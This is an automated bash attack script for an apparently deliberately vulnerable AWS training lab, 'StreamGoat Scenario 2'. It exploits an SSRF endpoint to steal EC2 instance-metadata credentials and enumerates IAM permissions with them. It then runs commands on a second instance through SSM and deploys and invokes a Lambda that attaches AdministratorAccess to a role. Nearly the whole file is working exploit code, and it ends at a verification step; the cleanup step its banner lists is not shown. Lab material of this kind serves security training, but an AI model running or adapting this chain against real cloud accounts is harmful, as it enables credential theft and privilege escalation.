#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 2              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Exploitation of Web SSRF, IMDS stealing on EC2a\n"
  printf "  • Step 2. Permission enumeration for stolen IMDS\n"
  printf "  • Step 3. Access gathering to EC2b\n"
  printf "  • Step 4. Installing awscli to perform next action from the inside\n"
  printf "  • Step 5. Review Role and Permissions assigned on EC2b\n"
  printf "  • Step 6. Discovering AttachRolePolicy permissions via SSM\n"
  printf "  • Step 7. PrivEsc Lambda 'StreamGoat-PrivEsc-Lambda' creation via SSM\n"
  printf "  • Step 8. Invoke PrivEsc Lambda\n"
  printf "  • Step 9. Check permissions using IMDS from EC2a once again\n"
  printf "  • Step 10. Cleanup, PrivEsc Lambda removal\n"

}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq session-manager-plugin; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }
printf "\n"
read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
#############################################
# Step 1. Step 1. Exploitation of Web SSRF, IMDS stealing on EC2a
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploitation of Web SSRF, IMDS stealing on EC2a  ===" "${RESET}"
is_valid_ipv4() {
  local ip="$1" o1 o2 o3 o4
  [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  IFS='.' read -r o1 o2 o3 o4 <<<"$ip"
  for o in "$o1" "$o2" "$o3" "$o4"; do
    [[ $o =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || return 1
  done
  return 0
}

# ---- Prompt + IP format validation loop (keeps asking until valid) ----
step "Target selection"
while :; do
  read -r -p "Enter IP of vulnerable application: " TARGET_IP
  if is_valid_ipv4 "$TARGET_IP"; then
    ok "IP format looks valid: $TARGET_IP"
    break
  else
    err "Invalid IPv4 address. Expected dotted quad (e.g., 203.0.113.10). Try again."
  fi
done

TARGET="http://$TARGET_IP/ssrf"

# ---- Connectivity check: require HTTP 200 on /cmd?c=id ----
step "Probing $TARGET for SSRF reachability (expects HTTP 200)"
spin_start "Sending test request (url=http://127.0.0.1)"
set +e
HTTP_CODE="$(curl -sS -m 8 --connect-timeout 4 -o /dev/null -w "%{http_code}" \
                  -G --data-urlencode url=http://127.0.0.1 "$TARGET")"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ]; then
  err "curl failed (exit $CURL_RC). Check SG/NACL/route/DNS."
  exit 1
fi
if [ "$HTTP_CODE" != "200" ]; then
  err "Endpoint responded with HTTP $HTTP_CODE (expected 200). Aborting."
  exit 1
fi
ok "SSRF endpoint reachable (HTTP 200) — proceeding."

step "Verification of exploitation SSRF"
ok "Requesting role name from http://169.254.169.254/latest/meta-data/iam/security-credentials/"
TARGET_ROLE=$(curl -sG $TARGET?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo $TARGET_ROLE
# Fetch creds JSON from the target (same logic you used), safely URL-encoded via stdin
ok "Requesting IMDS from http://169.254.169.254/latest/meta-data/iam/security-credentials/$TARGET_ROLE"
CREDS_JSON="$(curl -sG $TARGET?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$TARGET_ROLE)"


# Parse & set default profile
AKID=$(jq -r '.AccessKeyId'    <<<"$CREDS_JSON")
SECK=$(jq -r '.SecretAccessKey' <<<"$CREDS_JSON")
SESS=$(jq -r '.Token'           <<<"$CREDS_JSON")
EXP=$(jq -r '.Expiration'       <<<"$CREDS_JSON")

if [ -z "$AKID" ] || [ "$AKID" = "null" ]; then
  echo "Failed to parse creds JSON:" >&2
  echo "$CREDS_JSON" | sed -e 's/./&/120g' >&2
  exit 1
else
  ok "IMDS successfully stolen"
  info "AccessKeyId: $AKID"
  info "Expiration : $EXP"
fi
spin_start "Configuring awscli profile"
PROFILE="streamgoat-scenario-2"
aws configure set aws_access_key_id     "$AKID"   --profile default --profile "$PROFILE"
aws configure set aws_secret_access_key "$SECK"   --profile default --profile "$PROFILE"
aws configure set aws_session_token     "$SESS"   --profile default --profile "$PROFILE"
aws configure set region                us-east-1 --profile default --profile "$PROFILE"   # adjust if needed
spin_stop
printf "\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 1
#############################################
# Step 2. Permission enumeration for stolen IMDS
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for stolen IMDS  ===" "${RESET}"
# init colors (portable)

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}


# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity  --profile "$PROFILE"
aws sts get-caller-identity --profile "$PROFILE"
try "List account aliases"  aws iam list-account-aliases --profile "$PROFILE"

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
aws ec2 describe-instances  --profile "$PROFILE"\
  --filters "Name=tag:Name,Values=StreamGoat-*" \
            "Name=instance-state-name,Values=running" \
  --query 'Reservations[].Instances[].{Id:InstanceId,State:State.Name,PublicIP:PublicIpAddress,PrivateIP:PrivateIpAddress,Name: Tags[?Key==`Name`]|[0].Value}' \
  --output table
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 2
#############################################
# Step 3. Access gathering to EC2b
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Access gathering to EC2b  ===" "${RESET}"
printf "We are going to validate two more permissions which may give us direct access to EC2b\n\n"
read IID AZ PUBIP <<<"$(aws ec2 describe-instances  --profile "$PROFILE"\
  --filters 'Name=instance-state-name,Values=running' 'Name=tag:Name,Values=StreamGoat-EC2b' \
  --query 'Reservations[].Instances[][InstanceId,Placement.AvailabilityZone,PublicIpAddress]' \
  --output text | head -n1)"

: "${IID:?no instance found}"
: "${AZ:?no AZ found}"

# -------------------------
# (A) EC2 Instance Connect
# -------------------------
# Requirements:
#   - IAM on the *caller*: ec2-instance-connect:SendSSHPublicKey (resource: the instance ARN)
#   - Network: you still need network/SecGrp open to actually SSH (permission probe works w/o it)
#   - OS user commonly 'ubuntu' (Ubuntu), 'ec2-user' (Amazon Linux), 'admin' (Debian), etc.
EIC_OSUSER="${EIC_OSUSER:-ubuntu}"

# Generate a throwaway key
rm -f /tmp/streamgoat_eic_* 2>/dev/null || true
KEY=/tmp/streamgoat_eic_$$
ssh-keygen -t ed25519 -N '' -f "$KEY" -q

# Permission probe (does the API let us publish a key?)
try "EC2InstanceConnect SendSSHPublicKey" \
  aws ec2-instance-connect send-ssh-public-key  --profile "$PROFILE"\
    --instance-id "$IID" \
    --availability-zone "$AZ" \
    --instance-os-user "$EIC_OSUSER" \
    --ssh-public-key "file://$KEY.pub" \
    --query Success --output text

# -------------------------
# (B) SSM Command Execution
# -------------------------
# Permission-aware probe: interpret AccessDenied vs TargetNotConnected
ssm_probe() {
  local iid="$1"
  local out rc cmdId

  # Run the call once, capture output safely under set -e
  set +e
  out="$(aws ssm send-command  --profile "$PROFILE"\
          --document-name AWS-RunShellScript \
          --parameters commands='["whoami"]' \
          --instance-ids "$iid" \
          --comment "perm-probe $(date)" 2>&1)"
  rc=$?
  set -e

  if [ $rc -eq 0 ]; then
    cmdId="$(jq -r '.Command.CommandId' <<<"$out" 2>/dev/null)"
    try "SSM SendCommand:$YELLOW whoami$RESET" true
    # Optional: fetch invocation result (may be Pending/Success/Error)
    aws ssm get-command-invocation  --profile "$PROFILE" --command-id "${cmdId}" --instance-id "$iid" | jq -r '.StandardOutputContent' || true

  elif grep -qi 'TargetNotConnected' <<<"$out"; then
    try "SSM SendCommand allowed, but instance is not SSM-connected (agent/role/network)" true

  elif grep -qi 'AccessDenied' <<<"$out"; then
    try "SSM SendCommand not permitted (AccessDenied)" false

  else
    err "SSM SendCommand unexpected error (printing raw output below)"
    printf "%s\n" "$out"
  fi
}

ssm_probe "$IID"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 3
#############################################
# Step 4. Installing awscli to perform next action from the inside
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. AWS CLI Installation and Privilege Review on EC2b  ===" "${RESET}"

step "Triggering 'apt update && apt install awscli -y' via SSM on EC2b"

INSTALL_CMD_ID="$(aws ssm send-command  --profile "$PROFILE"\
  --document-name "AWS-RunShellScript" \
  --comment "Installing awscli for inspection" \
  --instance-ids "$IID" \
  --parameters 'commands=["sudo apt update -y && sudo apt install -y awscli"]' \
  --query 'Command.CommandId' \
  --output text)"

# Spinner animation during install
spin_start "Installation of awscli tool..."
sleep 60
spin_stop
ok "awscli installation command triggered"
printf "\n"
read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 4
#############################################
# Step 5. Review Role and Permissions assigned on EC2b
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "=== 5. Review Role and Permissions assigned on EC2b  ===" "${RESET}"

step "Running 'aws sts get-caller-identity' on EC2b"
IDENTITY_CMD_ID="$(aws ssm send-command  --profile "$PROFILE"\
  --document-name "AWS-RunShellScript" \
  --comment "GetCallerIdentity via awscli" \
  --instance-ids "$IID" \
  --parameters 'commands=["aws sts get-caller-identity"]' \
  --query 'Command.CommandId' \
  --output text)"

sleep 3

ROLE_NAME="$(aws ssm get-command-invocation  --profile "$PROFILE"\
  --command-id "$IDENTITY_CMD_ID" \
  --instance-id "$IID" \
  --query 'StandardOutputContent' \
  --output text | jq -r '.Arn' | awk -F/ '{print $2}')"

ok "Discovered role name: $YELLOW$ROLE_NAME$RESET"

# 3. List inline policies attached to the role
step "Listing role policies for IAM role: $ROLE_NAME"
POLICY_CMD_ID="$(aws ssm send-command  --profile "$PROFILE"\
  --document-name "AWS-RunShellScript" \
  --comment "ListRolePolicies for EC2b Role" \
  --instance-ids "$IID" \
  --parameters "commands=[\"aws iam list-role-policies --role-name $ROLE_NAME\"]" \
  --query 'Command.CommandId' \
  --output text)"

sleep 3

POLICY_NAME="$(aws ssm get-command-invocation --profile "$PROFILE"\
  --command-id "$POLICY_CMD_ID" \
  --instance-id "$IID" \
  --query 'StandardOutputContent' \
  --output text | jq -r '.PolicyNames[0]')"

ok "Discovered inline policy: $YELLOW$POLICY_NAME$RESET"

# 4. Get policy content
step "Reading policy $POLICY_NAME attached to $ROLE_NAME"
PRIVS_CMD_ID="$(aws ssm send-command  --profile "$PROFILE"\
  --document-name "AWS-RunShellScript" \
  --comment "GetRolePolicy to enumerate privileges" \
  --instance-ids "$IID" \
  --parameters "commands=[\"aws iam get-role-policy --role-name $ROLE_NAME --policy-name $POLICY_NAME\"]" \
  --query 'Command.CommandId' \
  --output text)"

sleep 3

POLICY_CONTENT="$(aws ssm get-command-invocation  --profile "$PROFILE"\
  --command-id "$PRIVS_CMD_ID" \
  --instance-id "$IID" \
  --query 'StandardOutputContent' \
  --output text)"

echo -e "${CYAN}Parsed Privileges in Inline Policy:${RESET}"
echo "$POLICY_CONTENT" | jq -r '.PolicyDocument.Statement[].Action'

printf "\nWe were able to check role, policy and permissions because EC2a has assigned: ${YELLOW}iam:ListRoles${RESET}, ${YELLOW}iam:ListRolePolicies${RESET}, ${YELLOW}iam:GetRolePolicy${RESET} and ${YELLOW}iam:GetRole${RESET}.\n"
printf "With having ${YELLOW}lambda:CreateFunction${RESET} and ${YELLOW}iam:PassRole${RESET} we may create Lambda and set Role to it.\n"
printf "If we found Role with ${YELLOW}iam:AttachRolePolicy${RESET} we will be able to create PrivEsc Lambda.\n"
printf "And then execute it having ${YELLOW}lambda:InvokeFunction${RESET}.\n"
printf "\n"
read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 5
#############################################
# Step 6. Discovering AttachRolePolicy permissions via SSM
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "=== 6. Discovering AttachRolePolicy permissions via SSM ===" "${RESET}"

ROLE_PREFIX="StreamGoat-"

# -------------------------
# SSM #1 — Find roles with the prefix
# -------------------------
step "SSM #1: Listing roles with prefix ${ROLE_PREFIX}"
CMD1_ID="$(aws ssm send-command  --profile "$PROFILE"\
  --document-name 'AWS-RunShellScript' \
  --comment 'List StreamGoat-* roles' \
  --instance-ids "$IID" \
  --parameters 'commands=["aws iam list-roles --query '\''Roles[?starts_with(RoleName, `StreamGoat-`)].RoleName'\'' --output json"]' \
  --query 'Command.CommandId' \
  --output text)"

sleep 3
ROLES_JSON="$(aws ssm get-command-invocation  --profile "$PROFILE"\
  --command-id "$CMD1_ID" \
  --instance-id "$IID" \
  --query 'StandardOutputContent' \
  --output text | sed -n '1,200p')"

# Normalize JSON; tolerate blank outputs
if ! printf '%s' "$ROLES_JSON" | jq -e . >/dev/null 2>&1; then
  err "Failed to parse roles JSON from SSM #1"
  printf "Raw output:\n%s\n" "$ROLES_JSON"
  exit 1
fi

mapfile -t ROLES < <(printf '%s' "$ROLES_JSON" | jq -r '.[]' 2>/dev/null)
if ((${#ROLES[@]}==0)); then
  err "No roles found with prefix ${ROLE_PREFIX}"
  exit 0
fi

ok "Found ${#ROLES[@]} role(s)"

# -------------------------
# SSM #2 — For each role, list inline policy names
# -------------------------
# Ensure bash associative arrays
declare -A POLICIES

# Robust SSM exec that waits until the command is finished and returns stdout
ssm_exec_stdout() {
  local instance_id="$1"; shift
  local comment="$1"; shift
  local commands_json="$1"; shift

  local cmd_id status tries=0
  cmd_id="$(aws ssm send-command  --profile "$PROFILE"\
    --document-name "AWS-RunShellScript" \
    --comment "$comment" \
    --instance-ids "$instance_id" \
    --parameters "commands=$commands_json" \
    --query 'Command.CommandId' \
    --output text)"

  # poll until terminal status
  while :; do
    # get-command-invocation returns nonzero while still provisioning; ignore errors
    status="$(aws ssm get-command-invocation  --profile "$PROFILE"\
      --command-id "$cmd_id" \
      --instance-id "$instance_id" \
      --query 'Status' \
      --output text 2>/dev/null || echo 'InProgress')"

    case "$status" in
      Success|Failed|Cancelled|TimedOut) break ;;
      *) sleep 1 ;;
    esac

    tries=$((tries+1))
    [ "$tries" -gt 120 ] && break  # ~2 minutes guard
  done

  aws ssm get-command-invocation  --profile "$PROFILE"\
    --command-id "$cmd_id" \
    --instance-id "$instance_id" \
    --query 'StandardOutputContent' \
    --output text
}

# iterate roles and collect inline policies
for role in "${ROLES[@]}"; do
  step "Listing inline policies for role: $role"

  # IMPORTANT: make the remote output JSON-only to simplify parsing locally
  # We request just the PolicyNames JSON array.
  out="$(ssm_exec_stdout "$IID" "List inline policies for $role" \
        "[\"aws iam list-role-policies --role-name $role --query PolicyNames --output json\"]")"

  # 'out' should be a JSON array; parse robustly
  if jq -e . >/dev/null 2>&1 <<<"$out"; then
    # Convert JSON array to a bash-friendly space-separated list
    mapfile -t pols < <(jq -r '.[]' <<<"$out")
  else
    # fallback: try to extract the first JSON array-looking segment
    json_guess="$(grep -o '\[[^]]*\]' <<<"$out" | head -n1)"
    if [ -n "$json_guess" ] && jq -e . >/dev/null 2>&1 <<<"$json_guess"; then
      mapfile -t pols < <(jq -r '.[]' <<<"$json_guess")
    else
      err "Could not parse inline policy list for $role"
      pols=()
    fi
  fi

  # Store mapping: role -> "p1 p2 p3"
  if ((${#pols[@]} > 0)); then
    POLICIES["$role"]="$(printf '%s ' "${pols[@]}")"
    ok "Inline policies for $role: ${YELLOW}${POLICIES[$role]}${RESET}"
  else
    POLICIES["$role"]=""
    info "No inline policies attached to $role"
  fi
done

# Example: print the built map
printf "\n%sPolicies map (role -> inline policies)%s\n" "$BOLD" "$RESET"
for role in "${!POLICIES[@]}"; do
  printf "  - %s: %s\n" "$role" "${POLICIES[$role]}"
done


# -------------------------
# SSM #3 — 
# -------------------------
#############################################
# Step 6.b — Scan inline policies for iam:AttachRolePolicy (1 SSM per policy)
#############################################

# JQ: normalize Statement and Action (obj/array → array) and emit actions
jq_actions_filter='
  def toarr(x): if (x|type)=="array" then x else [x] end;
  (.PolicyDocument.Statement | toarr(.))[]
  | select(.Effect=="Allow")
  | .Action
  | toarr(.)
  | .[]
'

BEST_ROLE_EXACT=""
BEST_ROLE_ANY=""

for role in "${!POLICIES[@]}"; do
  # Split the space-separated list you stored in POLICIES["$role"]
  read -r -a pnames <<<"${POLICIES[$role]}"
  [ ${#pnames[@]} -eq 0 ] && continue

  step "Inspecting inline policies on role: $role"
  for pn in "${pnames[@]}"; do
    [ -z "$pn" ] && continue

    # IMPORTANT: ask the remote to return FULL JSON; no --query/--output text here
    out="$(ssm_exec_stdout "$IID" "GetRolePolicy $pn on $role" \
          "[\"aws iam get-role-policy --role-name $role --policy-name $pn --output json\"]")"

    # Extract actions from Allow statements
    actions="$(jq -r "$jq_actions_filter" <<<"$out" 2>/dev/null || true)"

    # Match exact AttachRolePolicy or effective wildcards
    if printf '%s\n' "$actions" | grep -E -qi '^(iam:AttachRolePolicy|iam:\*|\*)$'; then
      while IFS= read -r a; do
        [[ "$a" =~ ^(iam:AttachRolePolicy|iam:\*|\*)$ ]] || continue
        printf "%s[HIT]%s role=%s policy=%s grants=%s\n" "$GREEN" "$RESET" "$role" "$pn" "$a"
        HITS+=("$role|$pn|$a")
        [ -z "$BEST_ROLE_ANY" ] && BEST_ROLE_ANY="$role"
        if [ "$a" = "iam:AttachRolePolicy" ] && [ -z "$BEST_ROLE_EXACT" ]; then
          BEST_ROLE_EXACT="$role"
        fi
      done <<<"$actions"
    else
      info "No Attach-like grants in $role/$pn"
    fi
  done
done

printf "\n=== Summary (inline policy hits) ===\n"
if [ "${#HITS[@]}" -gt 0 ]; then
  for h in "${HITS[@]}"; do IFS='|' read -r r p a <<<"$h"; printf "role=${YELLOW}%s${RESET}\npolicy=${YELLOW}%s${RESET}\naction=${YELLOW}%s${RESET}\n" "$r" "$p" "$a"; done
  BEST_ROLE="${BEST_ROLE_EXACT:-$BEST_ROLE_ANY}"
  [ -n "$BEST_ROLE" ] && printf "\nBEST_ROLE = %s\n" "${YELLOW}$BEST_ROLE${RESET}"
else
  printf "  (no inline policies granting iam:AttachRolePolicy / iam:* / *)\n"
fi
printf "\n"
read -r -p "Step 6 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 6
#############################################
# Step 7. PrivEsc Lambda 'StreamGoat-PrivEsc-Lambda' creation via SSM
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "=== 7. PrivEsc Lambda 'StreamGoat-PrivEsc-Lambda' creation via SSM ===" "${RESET}"

printf "We are going to create PrivEsc and set ${YELLOW}$BEST_ROLE${RESET} role on it.\n"
printf "PrivEsc Lambda will attach default AWS policy ${YELLOW}AdministratorAccess${RESET} to Role of EC2a we already has access to:
${YELLOW}import boto3

def lambda_handler(event, context):
    role = (event or {}).get('role_name', 'StreamGoat-JumpHostRole')
    return boto3.client('iam').attach_role_policy(
        RoleName=role,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )${RESET}\n\n"

# --- Inputs / computed values (local) ---
: "${IID:?Missing EC2b instance-id (IID)}"
: "${BEST_ROLE:?BEST_ROLE is empty; run Step 6 to discover a role with iam:AttachRolePolicy}"

REGION="us-east-1"
LAMBDA_NAME="StreamGoat-PrivEsc-Lambda"

ACCOUNT="$(aws sts get-caller-identity --profile "$PROFILE" --query Account --output text)"
ROLE_ARN="arn:aws:iam::${ACCOUNT}:role/${BEST_ROLE}"
ok "Using execution role: ${YELLOW}${ROLE_ARN}${RESET}"

# Lambda source, exact as requested
LAMBDA_SRC=$(cat <<'PYCODE'
import boto3

def lambda_handler(event, context):
    role = (event or {}).get('role_name', 'StreamGoat-JumpHostRole')
    return boto3.client('iam').attach_role_policy(
        RoleName=role,
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
PYCODE
)

# Base64 for safe transport
LAMBDA_B64="$(printf '%s' "$LAMBDA_SRC" | base64 | tr -d '\n')"

# --- Remote script (NO local expansion) ---
REMOTE_SCRIPT=$(cat <<'EOS'
set -euo pipefail

# Assert env present
: "${LAMBDA_NAME:?missing LAMBDA_NAME}"
: "${ROLE_ARN:?missing ROLE_ARN}"
: "${REGION:?missing REGION}"
: "${LAMBDA_B64:?missing LAMBDA_B64}"

# 1) write code
mkdir -p /tmp
echo "${LAMBDA_B64}" | base64 -d > /tmp/lambda_function.py

# 2) make zip via python (no external zip dependency)
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('/tmp/function.zip','w',zipfile.ZIP_DEFLATED)
z.write('/tmp/lambda_function.py','lambda_function.py')
z.close()
PY

# 3) create or update Lambda
set +e
CREATE_OUT="$(aws lambda create-function \
  --function-name "${LAMBDA_NAME}" \
  --runtime python3.9 \
  --role "${ROLE_ARN}" \
  --handler lambda_function.lambda_handler \
  --zip-file fileb:///tmp/function.zip \
  --timeout 10 \
  --memory-size 128 \
  --region "${REGION}" 2>&1)"
RC=$?
set -e

if [ $RC -eq 0 ]; then
  echo "[OK] Created Lambda ${LAMBDA_NAME}"
else
  if echo "$CREATE_OUT" | grep -qi 'ResourceConflictException'; then
    echo "[i] Function exists; updating code…"
    aws lambda update-function-code \
      --function-name "${LAMBDA_NAME}" \
      --zip-file fileb:///tmp/function.zip \
      --region "${REGION}" \
      >/dev/null
  else
    echo "[ERR] Failed to create function:"
    echo "$CREATE_OUT"
    exit 1
  fi
fi

# 4) Show ARN (no jq dependency)
ARN="$(aws lambda get-function \
  --function-name "${LAMBDA_NAME}" \
  --region "${REGION}" \
  --query 'Configuration.FunctionArn' --output text)"
echo "FunctionArn=${ARN}"
EOS
)

# Encode the remote script to avoid quoting pitfalls
RS_B64="$(printf '%s' "$REMOTE_SCRIPT" | base64 | tr -d '\n')"

# Build SSM commands: export env, materialize script from base64, execute
commands_json="$(jq -cn \
  --arg LAMBDA_NAME "$LAMBDA_NAME" \
  --arg ROLE_ARN "$ROLE_ARN" \
  --arg REGION "$REGION" \
  --arg LAMBDA_B64 "$LAMBDA_B64" \
  --arg RS_B64 "$RS_B64" \
  '[
     "export LAMBDA_NAME=\($LAMBDA_NAME)",
     "export ROLE_ARN=\($ROLE_ARN)",
     "export REGION=\($REGION)",
     "export LAMBDA_B64=\($LAMBDA_B64)",
     "printf %s \($RS_B64) | base64 -d > /tmp/sg_step7.sh",
     "chmod +x /tmp/sg_step7.sh",
     "bash -lc /tmp/sg_step7.sh"
   ]'
)"

step "Creating/Updating Lambda '${LAMBDA_NAME}' on EC2b via SSM"
OUT="$(ssm_exec_stdout "$IID" "Create/Update ${LAMBDA_NAME}" "$commands_json")" || true
printf "%s\n" "$OUT" | sed -n '1,200p'
printf "\n"
read -r -p "Step 7 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 7
#############################################
# Step 8. Invoke PrivEsc Lambda
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "=== 8. Invoke Lambda 'StreamGoat-PrivEsc-Lambda' via SSM on EC2b ===" "${RESET}"

: "${IID:?Missing EC2b instance-id (IID)}"
: "${REGION:?Missing AWS region (REGION)}"
: "${LAMBDA_NAME:?Missing Lambda name (LAMBDA_NAME)}"

step "Preparing base64 event + remote script to invoke ${LAMBDA_NAME} and verify attachment"

commands_json="$(jq -cn \
  --arg LAMBDA_NAME "$LAMBDA_NAME" \
  --arg REGION "$REGION" \
  --arg EVENT_B64 "$(printf '%s' '{"role_name":"StreamGoat-JumpHostRole"}' | base64 | tr -d '\n')" \
  --arg RS8_B64 "$(
    cat <<'EOS' | base64 | tr -d '\n'
set -euo pipefail
: "${LAMBDA_NAME:?missing LAMBDA_NAME}"
: "${REGION:?missing REGION}"
: "${EVENT_B64:?missing EVENT_B64}"

# Materialize the event JSON
echo "${EVENT_B64}" | base64 -d > /tmp/sg_step8_event.json

# Invoke the Lambda
aws lambda invoke \
  --function-name "${LAMBDA_NAME}" \
  --payload fileb:///tmp/sg_step8_event.json \
  --region "${REGION}" \
  /tmp/sg_step8_out.json

# Verify the effect (AdministratorAccess attached to StreamGoat-JumpHostRole)
echo "[i] Verifying attached policies on role StreamGoat-JumpHostRole:"
aws iam list-attached-role-policies \
  --role-name StreamGoat-JumpHostRole \
  --region "${REGION}" \
  --query "AttachedPolicies[].PolicyArn" \
  --output text
EOS
  )" \
  '[
     "export LAMBDA_NAME=\($LAMBDA_NAME)",
     "export REGION=\($REGION)",
     "export EVENT_B64=\($EVENT_B64)",
     "printf %s \($RS8_B64) | base64 -d > /tmp/sg_step8.sh",
     "chmod +x /tmp/sg_step8.sh",
     "bash -lc /tmp/sg_step8.sh"
   ]'
)"

info "Invoking Lambda via SSM on EC2b…"
OUT="$(ssm_exec_stdout "$IID" "Invoke ${LAMBDA_NAME} & verify" "$commands_json")" || true
printf "%s\n" "$OUT" | sed -n '1,200p'

#if printf '%s' "$OUT" | grep -q 'arn:aws:iam::aws:policy/AdministratorAccess'; then
#  ok "AdministratorAccess is attached to StreamGoat-JumpHostRole"
#elif printf '%s' "$OUT" | grep -qi 'AccessDenied\|ResourceNotFoundException\|AccessDeniedException'; then
#  err "Lambda invoke or IAM attach failed (see output above for the AWS error)"
#else
#  info "Review the output above; ensure EC2b role has lambda:InvokeFunction and the Lambda exists in ${REGION}"
#fi
printf "\n"
read -r -p "Step 8 is completed. Press Enter to finish (or Ctrl+C to abort)..." _ || true
#############################################
# End of Step 8
#############################################
# Step 9. Check permissions using IMDS from EC2a once again
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "=== 9. Permissions verification with IMDS from EC2a once again ===" "${RESET}"
printf "Repeating same verification we did on step 2\n\n"
try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
